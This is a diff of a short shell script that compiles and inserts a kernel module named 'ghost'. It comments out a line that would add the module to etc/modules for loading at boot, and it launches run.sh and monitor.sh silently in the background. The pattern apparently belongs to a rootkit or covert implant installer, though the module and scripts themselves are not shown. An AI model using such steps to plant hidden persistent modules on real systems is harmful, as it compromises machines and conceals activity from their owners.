@@ -3,12 +3,12 @@
 cd ghost
 make all
 insmod ghost.ko
-echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
+# echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
 cd ..
-
 # chmod +x dispose.sh
 # ./dispose.sh
-nohup ./run.sh & >/dev/null 2>&1 &
+chmod +x run.sh
+nohup ./run.sh &
 echo -e "\n\n"
 chmod 764 monitor.sh
 nohup monitor.sh >/dev/null 2>&1 &
